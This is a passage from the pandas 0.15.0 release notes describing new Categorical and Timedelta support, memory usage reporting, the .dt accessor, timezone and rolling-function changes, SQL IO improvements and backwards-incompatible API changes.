features\n~~~~~~~~~~~~\n\n.. _whatsnew_0150.cat:\n\nCategoricals in Series/DataFrame\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`~pandas.Categorical` can now be included in ``Series`` and ``DataFrames`` and gained new\nmethods to manipulate. Thanks to Jan Schulz for much of this API/implementation. (:issue:`3943`, :issue:`5313`, :issue:`5314`,\n:issue:`7444`, :issue:`7839`, :issue:`7848`, :issue:`7864`, :issue:`7914`, :issue:`7768`, :issue:`8006`, :issue:`3678`,\n:issue:`8075`, :issue:`8076`, :issue:`8143`, :issue:`8453`, :issue:`8518`).\n\nFor full docs, see the :ref:`categorical introduction <categorical>` and the\n:ref:`API documentation <api.arrays.categorical>`.\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"id\": [1, 2, 3, 4, 5, 6],\n                       \"raw_grade\": ['a', 'b', 'b', 'a', 'a', 'e']})\n\n    df[\"grade\"] = df[\"raw_grade\"].astype(\"category\")\n    df[\"grade\"]\n\n     Rename the categories\n    df[\"grade\"] = df[\"grade\"].cat.rename_categories([\"very good\", \"good\", \"very bad\"])\n\n     Reorder the categories and simultaneously add the missing categories\n    df[\"grade\"] = df[\"grade\"].cat.set_categories([\"very bad\", \"bad\",\n                                                  \"medium\", \"good\", \"very good\"])\n    df[\"grade\"]\n    df.sort_values(\"grade\")\n    df.groupby(\"grade\", observed=False).size()\n\n- ``pandas.core.group_agg`` and ``pandas.core.factor_agg`` were removed. As an alternative, construct\n  a dataframe and use ``df.groupby(<group>).agg(<func>)``.\n\n- Supplying \"codes/labels and levels\" to the :class:`~pandas.Categorical` constructor is not\n  supported anymore. Supplying two arguments to the constructor is now interpreted as\n  \"values and levels (now called 'categories')\". Please change your code to use the :meth:`~pandas.Categorical.from_codes`\n  constructor.\n\n- The ``Categorical.labels`` attribute was renamed to ``Categorical.codes`` and is read\n  only. If you want to manipulate codes, please use one of the\n  :ref:`API methods on Categoricals <api.arrays.categorical>`.\n\n- The ``Categorical.levels`` attribute is renamed to ``Categorical.categories``.\n\n\n.. _whatsnew_0150.timedeltaindex:\n\nTimedeltaIndex/scalar\n^^^^^^^^^^^^^^^^^^^^^\n\nWe introduce a new scalar type ``Timedelta``, which is a subclass of ``datetime.timedelta``, and behaves in a similar manner,\nbut allows compatibility with ``np.timedelta64`` types as well as a host of custom representation, parsing, and attributes.\nThis type is very similar to how ``Timestamp`` works for ``datetimes``. It is a nice-API box for the type. See the :ref:`docs <timedeltas.timedeltas>`.\n(:issue:`3009`, :issue:`4533`, :issue:`8209`, :issue:`8187`, :issue:`8190`, :issue:`7869`, :issue:`7661`, :issue:`8345`, :issue:`8471`)\n\n.. warning::\n\n   ``Timedelta`` scalars (and ``TimedeltaIndex``) component fields are *not the same* as the component fields on a ``datetime.timedelta`` object. For example, ``.seconds`` on a ``datetime.timedelta`` object returns the total number of seconds combined between ``hours``, ``minutes`` and ``seconds``. In contrast, the pandas ``Timedelta`` breaks out hours, minutes, microseconds and nanoseconds separately.\n\n   .. code-block:: ipython\n\n       Timedelta accessor\n      In [9]: tds = pd.Timedelta('31 days 5 min 3 sec')\n\n      In [10]: tds.minutes\n      Out[10]: 5L\n\n      In [11]: tds.seconds\n      Out[11]: 3L\n\n       datetime.timedelta accessor\n       this is 5 minutes * 60 + 3 seconds\n      In [12]: tds.to_pytimedelta().seconds\n      Out[12]: 303\n\n   **Note**: this is no longer true starting from v0.16.0, where full\n   compatibility with ``datetime.timedelta`` is introduced. See the\n   :ref:`0.16.0 whatsnew entry <whatsnew_0160.api_breaking.timedelta>`\n\n.. warning::\n\n       Prior to 0.15.0 ``pd.to_timedelta`` would return a ``Series`` for list-like/Series input, and a ``np.timedelta64`` for scalar input.\n       It will now return a ``TimedeltaIndex`` for list-like input, ``Series`` for Series input, and ``Timedelta`` for scalar input.\n\n       The arguments to ``pd.to_timedelta`` are now ``(arg,unit='ns',box=True,coerce=False)``, previously were ``(arg,box=True,unit='ns')`` as these are more logical.\n\nConstruct a scalar\n\n.. ipython:: python\n\n   pd.Timedelta('1 days 06:05:01.00003')\n   pd.Timedelta('15.5us')\n   pd.Timedelta('1 hour 15.5us')\n\n    negative Timedeltas have this string repr\n    to be more consistent with datetime.timedelta conventions\n   pd.Timedelta('-1us')\n\n    a NaT\n   pd.Timedelta('nan')\n\nAccess fields for a ``Timedelta``\n\n.. ipython:: python\n\n   td = pd.Timedelta('1 hour 3m 15.5us')\n   td.seconds\n   td.microseconds\n   td.nanoseconds\n\nConstruct a ``TimedeltaIndex``\n\n.. ipython:: python\n   :suppress:\n\n   import datetime\n\n.. ipython:: python\n\n   pd.TimedeltaIndex(['1 days', '1 days, 00:00:05',\n                      np.timedelta64(2, 'D'),\n                      datetime.timedelta(days=2, seconds=2)])\n\nConstructing a ``TimedeltaIndex`` with a regular range\n\n.. ipython:: python\n\n   pd.timedelta_range('1 days', periods=5, freq='D')\n\n.. code-block:: python\n\n   In [20]: pd.timedelta_range(start='1 days', end='2 days', freq='30T')\n   Out[20]:\n   TimedeltaIndex(['1 days 00:00:00', '1 days 00:30:00', '1 days 01:00:00',\n                   '1 days 01:30:00', '1 days 02:00:00', '1 days 02:30:00',\n                   '1 days 03:00:00', '1 days 03:30:00', '1 days 04:00:00',\n                   '1 days 04:30:00', '1 days 05:00:00', '1 days 05:30:00',\n                   '1 days 06:00:00', '1 days 06:30:00', '1 days 07:00:00',\n                   '1 days 07:30:00', '1 days 08:00:00', '1 days 08:30:00',\n                   '1 days 09:00:00', '1 days 09:30:00', '1 days 10:00:00',\n                   '1 days 10:30:00', '1 days 11:00:00', '1 days 11:30:00',\n                   '1 days 12:00:00', '1 days 12:30:00', '1 days 13:00:00',\n                   '1 days 13:30:00', '1 days 14:00:00', '1 days 14:30:00',\n                   '1 days 15:00:00', '1 days 15:30:00', '1 days 16:00:00',\n                   '1 days 16:30:00', '1 days 17:00:00', '1 days 17:30:00',\n                   '1 days 18:00:00', '1 days 18:30:00', '1 days 19:00:00',\n                   '1 days 19:30:00', '1 days 20:00:00', '1 days 20:30:00',\n                   '1 days 21:00:00', '1 days 21:30:00', '1 days 22:00:00',\n                   '1 days 22:30:00', '1 days 23:00:00', '1 days 23:30:00',\n                   '2 days 00:00:00'],\n                  dtype='timedelta64[ns]', freq='30T')\n\nYou can now use a ``TimedeltaIndex`` as the index of a pandas object\n\n.. ipython:: python\n\n   s = pd.Series(np.arange(5),\n                 index=pd.timedelta_range('1 days', periods=5, freq='s'))\n   s\n\nYou can select with partial string selections\n\n.. ipython:: python\n\n   s['1 day 00:00:02']\n   s['1 day':'1 day 00:00:02']\n\nFinally, the combination of ``TimedeltaIndex`` with ``DatetimeIndex`` allow certain combination operations that are ``NaT`` preserving:\n\n.. ipython:: python\n\n   tdi = pd.TimedeltaIndex(['1 days', pd.NaT, '2 days'])\n   tdi.tolist()\n   dti = pd.date_range('20130101', periods=3)\n   dti.tolist()\n\n   (dti + tdi).tolist()\n   (dti - tdi).tolist()\n\n- iteration of a ``Series`` e.g. ``list(Series(...))`` of ``timedelta64[ns]`` would prior to v0.15.0 return ``np.timedelta64`` for each element. These will now be wrapped in ``Timedelta``.\n\n\n.. _whatsnew_0150.memory:\n\nMemory usage\n^^^^^^^^^^^^\n\nImplemented methods to find memory usage of a DataFrame. See the :ref:`FAQ <df-memory-usage>` for more. (:issue:`6852`).\n\nA new display option ``display.memory_usage`` (see :ref:`options`) sets the default behavior of the ``memory_usage`` argument in the ``df.info()`` method. By default ``display.memory_usage`` is ``True``.\n\n.. ipython:: python\n\n    dtypes = ['int64', 'float64', 'datetime64[ns]', 'timedelta64[ns]',\n              'complex128', 'object', 'bool']\n    n = 5000\n    data = {t: np.random.randint(100, size=n).astype(t) for t in dtypes}\n    df = pd.DataFrame(data)\n    df['categorical'] = df['object'].astype('category')\n\n    df.info()\n\nAdditionally :meth:`~pandas.DataFrame.memory_usage` is an available method for a dataframe object which returns the memory usage of each column.\n\n.. ipython:: python\n\n    df.memory_usage(index=True)\n\n\n.. _whatsnew_0150.dt:\n\nSeries.dt accessor\n^^^^^^^^^^^^^^^^^^\n\n``Series`` has gained an accessor to succinctly return datetime like properties for the *values* of the Series, if its a datetime/period like Series. (:issue:`7207`)\nThis will return a Series, indexed like the existing Series. See the :ref:`docs <basics.dt_accessors>`\n\n.. ipython:: python\n\n    datetime\n   s = pd.Series(pd.date_range('20130101 09:10:12', periods=4))\n   s\n   s.dt.hour\n   s.dt.second\n   s.dt.day\n   s.dt.freq\n\nThis enables nice expressions like this:\n\n.. ipython:: python\n\n   s[s.dt.day == 2]\n\nYou can easily produce tz aware transformations:\n\n.. ipython:: python\n\n   stz = s.dt.tz_localize('US/Eastern')\n   stz\n   stz.dt.tz\n\nYou can also chain these types of operations:\n\n.. ipython:: python\n\n   s.dt.tz_localize('UTC').dt.tz_convert('US/Eastern')\n\nThe ``.dt`` accessor works for period and timedelta dtypes.\n\n.. ipython:: python\n\n    period\n   s = pd.Series(pd.period_range('20130101', periods=4, freq='D'))\n   s\n   s.dt.year\n   s.dt.day\n\n.. ipython:: python\n\n    timedelta\n   s = pd.Series(pd.timedelta_range('1 day 00:00:05', periods=4, freq='s'))\n   s\n   s.dt.days\n   s.dt.seconds\n   s.dt.components\n\n\n.. _whatsnew_0150.tz:\n\nTimezone handling improvements\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- ``tz_localize(None)`` for tz-aware ``Timestamp`` and ``DatetimeIndex`` now removes timezone holding local time,\n  previously this resulted in ``Exception`` or ``TypeError`` (:issue:`7812`)\n\n  .. code-block:: ipython\n\n     In [58]: ts = pd.Timestamp('2014-08-01 09:00', tz='US/Eastern')\n\n     In[59]: ts\n     Out[59]: Timestamp('2014-08-01 09:00:00-0400', tz='US/Eastern')\n\n     In [60]: ts.tz_localize(None)\n     Out[60]: Timestamp('2014-08-01 09:00:00')\n\n     In [61]: didx = pd.date_range(start='2014-08-01 09:00', freq='H',\n        ....:                      periods=10, tz='US/Eastern')\n        ....:\n\n     In [62]: didx\n     Out[62]:\n     DatetimeIndex(['2014-08-01 09:00:00-04:00', '2014-08-01 10:00:00-04:00',\n                    '2014-08-01 11:00:00-04:00', '2014-08-01 12:00:00-04:00',\n                    '2014-08-01 13:00:00-04:00', '2014-08-01 14:00:00-04:00',\n                    '2014-08-01 15:00:00-04:00', '2014-08-01 16:00:00-04:00',\n                    '2014-08-01 17:00:00-04:00', '2014-08-01 18:00:00-04:00'],\n                   dtype='datetime64[ns, US/Eastern]', freq='H')\n\n     In [63]: didx.tz_localize(None)\n     Out[63]:\n     DatetimeIndex(['2014-08-01 09:00:00', '2014-08-01 10:00:00',\n                    '2014-08-01 11:00:00', '2014-08-01 12:00:00',\n                    '2014-08-01 13:00:00', '2014-08-01 14:00:00',\n                    '2014-08-01 15:00:00', '2014-08-01 16:00:00',\n                    '2014-08-01 17:00:00', '2014-08-01 18:00:00'],\n                   dtype='datetime64[ns]', freq=None)\n\n- ``tz_localize`` now accepts the ``ambiguous`` keyword which allows for passing an array of bools\n  indicating whether the date belongs in DST or not, 'NaT' for setting transition times to NaT,\n  'infer' for inferring DST/non-DST, and 'raise' (default) for an ``AmbiguousTimeError`` to be raised. See :ref:`the docs<timeseries.timezone_ambiguous>` for more details (:issue:`7943`)\n\n- ``DataFrame.tz_localize`` and ``DataFrame.tz_convert`` now accepts an optional ``level`` argument\n  for localizing a specific level of a MultiIndex (:issue:`7846`)\n\n- ``Timestamp.tz_localize`` and ``Timestamp.tz_convert`` now raise ``TypeError`` in error cases, rather than ``Exception`` (:issue:`8025`)\n\n- a timeseries/index localized to UTC when inserted into a Series/DataFrame will preserve the UTC timezone (rather than being a naive ``datetime64[ns]``) as ``object`` dtype (:issue:`8411`)\n\n- ``Timestamp.__repr__`` displays ``dateutil.tz.tzoffset`` info (:issue:`7907`)\n\n\n.. _whatsnew_0150.roll:\n\nRolling/expanding moments improvements\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- :func:`rolling_min`, :func:`rolling_max`, :func:`rolling_cov`, and :func:`rolling_corr`\n  now return objects with all ``NaN`` when ``len(arg) < min_periods <= window`` rather\n  than raising. (This makes all rolling functions consistent in this behavior). (:issue:`7766`)\n\n  Prior to 0.15.0\n\n  .. ipython:: python\n\n     s = pd.Series([10, 11, 12, 13])\n\n  .. code-block:: ipython\n\n     In [15]: pd.rolling_min(s, window=10, min_periods=5)\n     ValueError: min_periods (5) must be <= window (4)\n\n  New behavior\n\n  .. code-block:: ipython\n\n     In [4]: pd.rolling_min(s, window=10, min_periods=5)\n     Out[4]:\n     0   NaN\n     1   NaN\n     2   NaN\n     3   NaN\n     dtype: float64\n\n- :func:`rolling_max`, :func:`rolling_min`, :func:`rolling_sum`, :func:`rolling_mean`, :func:`rolling_median`,\n  :func:`rolling_std`, :func:`rolling_var`, :func:`rolling_skew`, :func:`rolling_kurt`, :func:`rolling_quantile`,\n  :func:`rolling_cov`, :func:`rolling_corr`, :func:`rolling_corr_pairwise`,\n  :func:`rolling_window`, and :func:`rolling_apply` with ``center=True`` previously would return a result of the same\n  structure as the input ``arg`` with ``NaN`` in the final ``(window-1)/2`` entries.\n\n  Now the final ``(window-1)/2`` entries of the result are calculated as if the input ``arg`` were followed\n  by ``(window-1)/2`` ``NaN`` values (or with shrinking windows, in the case of :func:`rolling_apply`).\n  (:issue:`7925`, :issue:`8269`)\n\n  Prior behavior (note final value is ``NaN``):\n\n  .. code-block:: ipython\n\n    In [7]: pd.rolling_sum(Series(range(4)), window=3, min_periods=0, center=True)\n    Out[7]:\n    0     1\n    1     3\n    2     6\n    3   NaN\n    dtype: float64\n\n  New behavior (note final value is ``5 = sum([2, 3, NaN])``):\n\n  .. code-block:: ipython\n\n     In [7]: pd.rolling_sum(pd.Series(range(4)), window=3,\n       ....:                min_periods=0, center=True)\n     Out[7]:\n     0    1\n     1    3\n     2    6\n     3    5\n     dtype: float64\n\n- :func:`rolling_window` now normalizes the weights properly in rolling mean mode (`mean=True`) so that\n  the calculated weighted means (e.g. 'triang', 'gaussian') are distributed about the same means as those\n  calculated without weighting (i.e. 'boxcar'). See :ref:`the note on normalization <window.weighted>` for further details. (:issue:`7618`)\n\n  .. ipython:: python\n\n    s = pd.Series([10.5, 8.8, 11.4, 9.7, 9.3])\n\n  Behavior prior to 0.15.0:\n\n  .. code-block:: ipython\n\n     In [39]: pd.rolling_window(s, window=3, win_type='triang', center=True)\n     Out[39]:\n     0         NaN\n     1    6.583333\n     2    6.883333\n     3    6.683333\n     4         NaN\n     dtype: float64\n\n  New behavior\n\n  .. code-block:: ipython\n\n     In [10]: pd.rolling_window(s, window=3, win_type='triang', center=True)\n     Out[10]:\n     0       NaN\n     1     9.875\n     2    10.325\n     3    10.025\n     4       NaN\n     dtype: float64\n\n- Removed ``center`` argument from all :func:`expanding_ <expanding_apply>` functions (see :ref:`list <api.functions_expanding>`),\n  as the results produced when ``center=True`` did not make much sense. (:issue:`7925`)\n\n- Added optional ``ddof`` argument to :func:`expanding_cov` and :func:`rolling_cov`.\n  The default value of ``1`` is backwards-compatible. (:issue:`8279`)\n\n- Documented the ``ddof`` argument to :func:`expanding_var`, :func:`expanding_std`,\n  :func:`rolling_var`, and :func:`rolling_std`. These functions' support of a\n  ``ddof`` argument (with a default value of ``1``) was previously undocumented. (:issue:`8064`)\n\n- :func:`ewma`, :func:`ewmstd`, :func:`ewmvol`, :func:`ewmvar`, :func:`ewmcov`, and :func:`ewmcorr`\n  now interpret ``min_periods`` in the same manner that the :func:`rolling_*()` and :func:`expanding_*()` functions do:\n  a given result entry will be ``NaN`` if the (expanding, in this case) window does not contain\n  at least ``min_periods`` values. The previous behavior was to set to ``NaN`` the ``min_periods`` entries\n  starting with the first non- ``NaN`` value. (:issue:`7977`)\n\n  Prior behavior (note values start at index ``2``, which is ``min_periods`` after index ``0``\n  (the index of the first non-empty value)):\n\n  .. ipython:: python\n\n    s  = pd.Series([1, None, None, None, 2, 3])\n\n  .. code-block:: ipython\n\n        In [51]: pd.ewma(s, com=3., min_periods=2)\n        Out[51]:\n        0         NaN\n        1         NaN\n        2    1.000000\n        3    1.000000\n        4    1.571429\n        5    2.189189\n        dtype: float64\n\n  New behavior (note values start at index ``4``, the location of the 2nd (since ``min_periods=2``) non-empty value):\n\n  .. code-block:: ipython\n\n     In [2]: pd.ewma(s, com=3., min_periods=2)\n     Out[2]:\n     0         NaN\n     1         NaN\n     2         NaN\n     3         NaN\n     4    1.759644\n     5    2.383784\n     dtype: float64\n\n- :func:`ewmstd`, :func:`ewmvol`, :func:`ewmvar`, :func:`ewmcov`, and :func:`ewmcorr`\n  now have an optional ``adjust`` argument, just like :func:`ewma` does,\n  affecting how the weights are calculated.\n  The default value of ``adjust`` is ``True``, which is backwards-compatible.\n  See :ref:`Exponentially weighted moment functions <window.exponentially_weighted>` for details. (:issue:`7911`)\n\n- :func:`ewma`, :func:`ewmstd`, :func:`ewmvol`, :func:`ewmvar`, :func:`ewmcov`, and :func:`ewmcorr`\n  now have an optional ``ignore_na`` argument.\n  When ``ignore_na=False`` (the default), missing values are taken into account in the weights calculation.\n  When ``ignore_na=True`` (which reproduces the pre-0.15.0 behavior), missing values are ignored in the weights calculation.\n  (:issue:`7543`)\n\n  .. code-block:: ipython\n\n     In [7]: pd.ewma(pd.Series([None, 1., 8.]), com=2.)\n     Out[7]:\n     0    NaN\n     1    1.0\n     2    5.2\n     dtype: float64\n\n     In [8]: pd.ewma(pd.Series([1., None, 8.]), com=2.,\n       ....:         ignore_na=True)   pre-0.15.0 behavior\n     Out[8]:\n     0    1.0\n     1    1.0\n     2    5.2\n     dtype: float64\n\n     In [9]: pd.ewma(pd.Series([1., None, 8.]), com=2.,\n       ....:         ignore_na=False)   new default\n     Out[9]:\n     0    1.000000\n     1    1.000000\n     2    5.846154\n     dtype: float64\n\n  .. warning::\n\n     By default (``ignore_na=False``) the :func:`ewm*()` functions' weights calculation\n     in the presence of missing values is different than in pre-0.15.0 versions.\n     To reproduce the pre-0.15.0 calculation of weights in the presence of missing values\n     one must specify explicitly ``ignore_na=True``.\n\n- Bug in :func:`expanding_cov`, :func:`expanding_corr`, :func:`rolling_cov`, :func:`rolling_cor`, :func:`ewmcov`, and :func:`ewmcorr`\n  returning results with columns sorted by name and producing an error for non-unique columns;\n  now handles non-unique columns and returns columns in original order\n  (except for the case of two DataFrames with ``pairwise=False``, where behavior is unchanged) (:issue:`7542`)\n- Bug in :func:`rolling_count` and :func:`expanding_*()` functions unnecessarily producing error message for zero-length data (:issue:`8056`)\n- Bug in :func:`rolling_apply` and :func:`expanding_apply` interpreting ``min_periods=0`` as ``min_periods=1`` (:issue:`8080`)\n- Bug in :func:`expanding_std` and :func:`expanding_var` for a single value producing a confusing error message (:issue:`7900`)\n- Bug in :func:`rolling_std` and :func:`rolling_var` for a single value producing ``0`` rather than ``NaN`` (:issue:`7900`)\n\n- Bug in :func:`ewmstd`, :func:`ewmvol`, :func:`ewmvar`, and :func:`ewmcov`\n  calculation of de-biasing factors when ``bias=False`` (the default).\n  Previously an incorrect constant factor was used, based on ``adjust=True``, ``ignore_na=True``,\n  and an infinite number of observations.\n  Now a different factor is used for each entry, based on the actual weights\n  (analogous to the usual ``N/(N-1)`` factor).\n  In particular, for a single point a value of ``NaN`` is returned when ``bias=False``,\n  whereas previously a value of (approximately) ``0`` was returned.\n\n  For example, consider the following pre-0.15.0 results for ``ewmvar(..., bias=False)``,\n  and the corresponding debiasing factors:\n\n  .. ipython:: python\n\n     s = pd.Series([1., 2., 0., 4.])\n\n  .. code-block:: ipython\n\n         In [89]: pd.ewmvar(s, com=2., bias=False)\n         Out[89]:\n         0   -2.775558e-16\n         1    3.000000e-01\n         2    9.556787e-01\n         3    3.585799e+00\n         dtype: float64\n\n         In [90]: pd.ewmvar(s, com=2., bias=False) / pd.ewmvar(s, com=2., bias=True)\n         Out[90]:\n         0    1.25\n         1    1.25\n         2    1.25\n         3    1.25\n         dtype: float64\n\n  Note that entry ``0`` is approximately 0, and the debiasing factors are a constant 1.25.\n  By comparison, the following 0.15.0 results have a ``NaN`` for entry ``0``,\n  and the debiasing factors are decreasing (towards 1.25):\n\n  .. code-block:: ipython\n\n     In [14]: pd.ewmvar(s, com=2., bias=False)\n     Out[14]:\n     0         NaN\n     1    0.500000\n     2    1.210526\n     3    4.089069\n     dtype: float64\n\n     In [15]: pd.ewmvar(s, com=2., bias=False) / pd.ewmvar(s, com=2., bias=True)\n     Out[15]:\n     0         NaN\n     1    2.083333\n     2    1.583333\n     3    1.425439\n     dtype: float64\n\n  See :ref:`Exponentially weighted moment functions <window.exponentially_weighted>` for details. (:issue:`7912`)\n\n\n.. _whatsnew_0150.sql:\n\nImprovements in the SQL IO module\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Added support for a ``chunksize`` parameter to ``to_sql`` function. This allows DataFrame to be written in chunks and avoid packet-size overflow errors (:issue:`8062`).\n- Added support for a ``chunksize`` parameter to ``read_sql`` function. Specifying this argument will return an iterator through chunks of the query result (:issue:`2908`).\n- Added support for writing ``datetime.date`` and ``datetime.time`` object columns with ``to_sql`` (:issue:`6932`).\n- Added support for specifying a ``schema`` to read from/write to with ``read_sql_table`` and ``to_sql`` (:issue:`7441`, :issue:`7952`).\n  For example:\n\n  .. code-block:: python\n\n         df.to_sql('table', engine, schema='other_schema')   noqa F821\n         pd.read_sql_table('table', engine, schema='other_schema')   noqa F821\n\n- Added support for writing ``NaN`` values with ``to_sql`` (:issue:`2754`).\n- Added support for writing datetime64 columns with ``to_sql`` for all database flavors (:issue:`7103`).\n\n\n.. _whatsnew_0150.api:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_0150.api_breaking:\n\nBreaking changes\n^^^^^^^^^^^^^^^^\n\nAPI changes related to ``Categorical`` (see :ref:`here <whatsnew_0150.cat>`\nfor more details):\n\n- The ``Categorical`` constructor with two arguments changed from\n  \"codes/labels and levels\" to \"values and levels (now called 'categories')\".\n  This can lead to subtle bugs. If you use :class:`~pandas.Categorical` directly,\n  please audit your code by changing it to use the :meth:`~pandas.Categorical.from_codes`\n  constructor.\n\n  An old function call like (prior to 0.15.0):\n\n  .. code-block:: python\n\n    pd.Categorical([0,1,0,2,1], levels=['a', 'b', 'c'])\n\n  will have to adapted to the following to keep the same behaviour:\n\n  .. code-block:: ipython\n\n    In [2]: pd.Categorical.from_codes([0,1,0,2,1], categories=['a', 'b', 'c'])\n    Out[2]:\n    [a, b, a, c, b]\n    Categories (3, object): [a, b, c]\n\nAPI changes related to the introduction of the ``Timedelta`` scalar (see\n:ref:`above <whatsnew_0150.timedeltaindex>` for more details):\n\n- Prior to 0.15.0 :func:`to_timedelta` would return a ``Series`` for list-like/Series input,\n  and a ``np.timedelta64`` for scalar input. It will now return a ``TimedeltaIndex`` for\n  list-like input, ``Series`` for Series input, and ``Timedelta`` for scalar input.\n\nFor API changes related to the rolling and expanding functions, see detailed overview :ref:`above <whatsnew_0150.roll>`.\n\nOther notable API changes:\n\n- Consistency when indexing with ``.loc`` and a list-like indexer when no values are found.\n\n  .. ipython:: python\n\n     df = pd.DataFrame([['a'], ['b']], index=[1, 2])\n     df\n\n  In prior versions there was a difference in these two constructs:\n\n  - ``df.loc[[3]]`` would return a frame reindexed by 3 (with all ``np.nan`` values)\n  - ``df.loc[[3],:]`` would raise ``KeyError``.\n\n  Both will now raise a ``KeyError``. The rule is that *at least 1* indexer must be found when using a list-like and ``.loc`` (:issue:`7999`)\n\n  Furthermore in prior versions these were also different:\n\n  - ``df.loc[[1,3]]`` would return a frame reindexed by [1,3]\n  - ``df.loc[[1,3],:]`` would raise ``KeyError``.\n\n  Both will now return a frame reindex by [1,3]. E.g.\n\n  .. code-block:: ipython\n\n     In [3]: df.loc[[1, 3]]\n     Out[3]:\n          0\n     1    a\n     3  NaN\n\n     In [4]: df.loc[[1, 3], :]\n     Out[4]:\n          0\n     1    a\n     3  NaN\n\n  This can also be seen in multi-axis indexing with a ``Panel``.\n\n  .. code-block:: python\n\n     >>> p = pd.Panel(np.arange(2 * 3 * 4).reshape(2, 3, 4),\n     ...              items=['ItemA', 'ItemB'],\n     ...              major_axis=[1, 2, 3],\n     ...              minor_axis=['A', 'B', 'C', 'D'])\n     >>> p\n     <class 'pandas.core.panel.Panel'>\n     Dimensions: 2 (items) x 3 (major_axis) x 4 (minor_axis)\n     Items axis: ItemA to ItemB\n     Major_axis axis: 1 to 3\n     Minor_axis axis: A to D\n\n\n  The following would raise ``KeyError`` prior to 0.15.0:\n\n  .. code-block:: ipython\n\n     In [5]:\n     Out[5]:\n        ItemA  ItemD\n     1      3    NaN\n     2      7    NaN\n     3     11    NaN\n\n  Furthermore, ``.loc`` will raise If no values are found in a MultiIndex with a list-like indexer:\n\n  .. ipython:: python\n     :okexcept:\n\n     s = pd.Series(np.arange(3, dtype='int64'),\n                   index=pd.MultiIndex.from_product([['A'],\n                                                    ['foo', 'bar', 'baz']],\n                                                    names=['one', 'two'])\n                   ).sort_index()\n     s\n     try:\n         s.loc[['D']]\n     except KeyError as e:\n         print(\"KeyError: \" + str(e))\n\n- Assigning values to ``None`` now considers the dtype when choosing an 'empty' value (:issue:`7941`).\n\n  Previously, assigning to ``None`` in numeric containers changed the\n  dtype to object (or errored, depending on the call). It now uses\n  ``NaN``:\n\n  .. ipython:: python\n\n     s = pd.Series([1., 2., 3.])\n     s.loc[0] = None\n     s\n\n  ``NaT`` is now used similarly for datetime containers.\n\n  For object containers, we now preserve ``None`` values (previously these\n  were converted to ``NaN`` values).\n\n  .. ipython:: python\n\n     s = pd.Series([\"a\", \"b\", \"c\"])\n     s.loc[0] = None\n     s\n\n  To insert a ``NaN``, you must explicitly use ``np.nan``. See the :ref:`docs <missing.inserting>`.\n\n- In prior versions, updating a pandas object inplace would not reflect in other python references to this object. (:issue:`8511`, :issue:`5104`)\n\n  .. ipython:: python\n\n     s = pd.Series([1, 2, 3])\n     s2 = s\n     s += 1.5\n\n  Behavior prior to v0.15.0\n\n  .. code-block:: ipython\n\n\n      the original object\n     In [5]: s\n     Out[5]:\n     0    2.5\n     1    3.5\n     2    4.5\n     dtype: float64\n\n\n      a reference to the original object\n     In [7]: s2\n     Out[7]:\n     0    1\n     1    2\n     2    3\n     dtype: int64\n\n  This is now the correct behavior\n\n  .. ipython:: python\n\n      the original object\n     s\n\n      a reference to the original object\n     s2\n\n.. _whatsnew_0150.blanklines:\n\n- Made both the C-based and Python engines for ``read_csv`` and ``read_table`` ignore empty lines in input as well as\n  white space-filled lines, as long as ``sep`` is not white space. This is an API change\n  that can be controlled by the keyword parameter ``skip_blank_lines``.  See :ref:`the docs <io.skiplines>` (:issue:`4466`)\n\n- A timeseries/index localized to UTC when inserted into a Series/DataFrame will preserve the UTC timezone\n  and inserted as ``object`` dtype rather than being converted to a naive ``datetime64[ns]`` (:issue:`8411`).\n\n- Bug in passing a ``DatetimeIndex`` with a timezone that was not being retained in DataFrame construction from a dict (:issue:`7822`)\n\n  In prior versions this would drop the timezone, now it retains the timezone,\n  but gives a column of ``object`` dtype:\n\n  .. ipython:: python\n\n        i = pd.date_range('1/1/2011', periods=3, freq='10s', tz='US/Eastern')\n        i\n        df = pd.DataFrame({'a': i})\n        df\n        df.dtypes\n\n  Previously this would have yielded a column of ``datetime64`` dtype, but without timezone info.\n\n  The behaviour of assigning a column to an existing dataframe as ``df['a'] = i``\n  remains unchanged (this already returned an  ``object`` column with a timezone).\n\n- When passing multiple levels to :meth:`~pandas.DataFrame.stack()`, it will now raise a ``ValueError`` when the\n  levels aren't all level names or all level numbers (:issue:`7660`). See\n  :ref:`Reshaping by stacking and unstacking <reshaping.stack_multiple>`.\n\n- Raise a ``ValueError`` in ``df.to_hdf`` with 'fixed' format, if ``df`` has non-unique columns as the resulting file will be broken (:issue:`7761`)\n\n- ``SettingWithCopy`` raise/warnings (according to the option ``mode.chained_assignment``) will now be issued when setting a value on a sliced mixed-dtype DataFrame using chained-assignment. (:issue:`7845`, :issue:`7950`)\n\n  .. code-block:: python\n\n     In [1]: df = pd.DataFrame(np.arange(0, 9), columns=['count'])\n\n     In [2]: df['group'] = 'b'\n\n     In [3]: df.iloc[0:5]['group'] = 'a'\n     /usr/local/bin/ipython:1: SettingWithCopyWarning:\n     A value is trying to be set on a copy of a slice from a DataFrame.\n     Try using .loc[row_indexer,col_indexer] = value instead\n\n     See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/indexing.html#indexing-view-versus-copy\n\n- ``merge``, ``DataFrame.merge``, and ``ordered_merge`` now return the same type\n  as the ``left`` argument (:issue:`7737`).\n\n- Previously an enlargement with a mixed-dtype frame would act unlike ``.append`` which will preserve dtypes (related :issue:`2578`, :issue:`8176`):\n\n  .. ipython:: python\n\n     df = pd.DataFrame([[True, 1], [False, 2]],\n                       columns=[\"female\", \"fitness\"])\n     df\n     df.dtypes\n\n      dtypes are now preserved\n     df.loc[2] = df.loc[1]\n     df\n     df.dtypes\n\n- ``Series.to_csv()`` now returns a string when ``path=None``, matching the behaviour of ``DataFrame.to_csv()`` (:issue:`8215`).\n\n- ``read_hdf`` now raises ``IOError`` when a file that doesn't exist is passed in. Previously, a new, empty file was created, and a ``KeyError`` raised (:issue:`7715`).\n\n- ``DataFrame.info()`` now ends its output with a newline character (:issue:`8114`)\n- Concatenating no objects will now raise a ``ValueError`` rather than a bare ``Exception``.\n- Merge errors will now be sub-classes of ``ValueError`` rather than raw ``Exception`` (:issue:`8501`)\n- ``DataFrame.plot`` and ``Series.plot`` keywords are now have consistent orders (:issue:`8037`)\n\n\n.. 